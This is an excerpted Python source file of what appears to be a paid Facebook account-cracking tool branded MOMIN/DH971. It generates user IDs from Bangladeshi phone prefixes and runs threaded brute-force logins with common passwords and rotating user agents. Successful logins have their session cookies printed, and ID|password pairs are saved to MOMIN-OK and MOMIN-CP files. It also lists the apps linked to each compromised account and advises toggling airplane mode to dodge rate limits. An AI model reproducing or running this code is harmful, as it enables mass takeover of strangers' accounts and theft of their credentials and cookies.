...
\033[1;32m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘""")
    ...
    jalan('\x1b[1;32m [3]\x1b[1;33m RANDOM CRACK 6 digite password ')
    jalan('\x1b[1;32m [4] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[5] \x1b[1;32mSUBSCRIBE MY CHANNEL')
    jalan(' \x1b[1;32m[6] \x1b[1;32mJOIN FB GROUP')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[MOMIN] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[MOMIN] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
...
┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
 '\033[1;33m'
8b    d8  dP"Yb  8b    d8 88 88b 88 
88b  d88 dP   Yb 88b  d88 88 88Yb88 
88YbdP88 Yb   dP 88YbdP88 88 88 Y88 
88 YY 88  YbodP  88 YY 88 88 88  Y8 
                            
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;32m┌━━━━━━━━━━━━━━━━━ \033[1;97mMOMIN\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┑
\033[1;32m┃   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mARIYAN.MOMIN            ┃
┃   \033[1;32mFACEBOK      : \033[1;32m MOMIN ISLAM              ┃
┃   \033[1;32mGITHUB       :  \033[1;32mMOMIN-KHAN        ┃
┃   \033[1;32mTOOL STATUS  :  \033[1;32mTOOL IS PAID            ┃
┃   \033[1;32mTEAM         :  \033[1;32mPRIVATE                 ┃
┃   \033[1;32mTOOL VIRSION :  \033[1;32m1.3                     ┃
┃   \033[1;32mTOOL WORK    :  \033[1;32mONLY DATA               ┃
└━━━━━━━━━━━━━━━━━ \033[1;97mMOMIN\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┘
\033[1;37m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
┃   ‌   \033[1;32mWELLCOME TO \033[1;37mDH971 TOOL\33[0;m        ┃
\033[1;37m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n""")
loop = 0
oks = []
cps = []
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[0:],love[1:],'bangladesh','iloveyou','i love you']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
    ...
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
x = open('/sdcard/mmm.1.txt','r').read().splitlines()
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            #pro = random.choice(xxxx)
            #pro = random.choice(xxx)
            #pro = random.choice(xx)
           # pro = random.choice(ugen+x+xx+xxx+ox+xxxx+ugen2+redmi)
           ...
           "scheme": 'https',
           "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchang ;v=b3;q=0.9',
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(MOMIN-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MOMIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MOMIN-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MOMIN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MOMIN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def i1():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        for love in user:
            ...
            pwx = [love[0:],love[1:],love[2:],code+love,'665544,bangladesh']
            uid = code+love
           # pwx = [love[0:]]
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(hcrack,uid,pwx,tl)
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
xxxx = open('/sdcard/mmm.1.txt','r').read().splitlines()
xxx = open('/sdcard/mmm.1.txt','r').read().splitlines()
xx = open('/sdcard/mmm.1.txt','r').read().splitlines()
ox = open('/sdcard/mmm.1.txt','r').read()
##pro = random.choice((ugen),(redmi),(xxxx),(xxx),(xx),(ugen2))
def dh6():
    user=[]
    ...
    os.geteuid
    gh = str(len(ugen))
#+x+xx+xxx+ox+xxxx+ugen2+redmi))
    clear()
    print(logo)
    print(f"                 {H} 6 DIGIT {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m BD CODE: {P}[{H}016{P}][{H}017{P}][{K}019{P}][{K}018{P}][{P}013{P}][{K}014{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print('\033[1;36m TOTAL UA: '+gh)
    print("")
  ...
  #  linex()
    ...
    with ThreadPool(max_workers=80) as manshera:    
        ...
        tli = str(len(ugen))
        #pr = (ugen)
        #open('/sdcard/usr.txt','a').write('%s\n' % ugen)
        
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m TOTAL UA: '+tli)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            ...
            dfg = code+love
            pwx = [love[0:]]
            #open('/sdcard/uidf.txt','w').write('%s\n' % uid)
            manshera.submit(hcrack,uid,pwx,tl)
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#(ugen+x+xx+xxx+ox+xxxx+ugen2+redmi))

def hcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    #open('/sdcard/uidf.txt','w').write(uid)
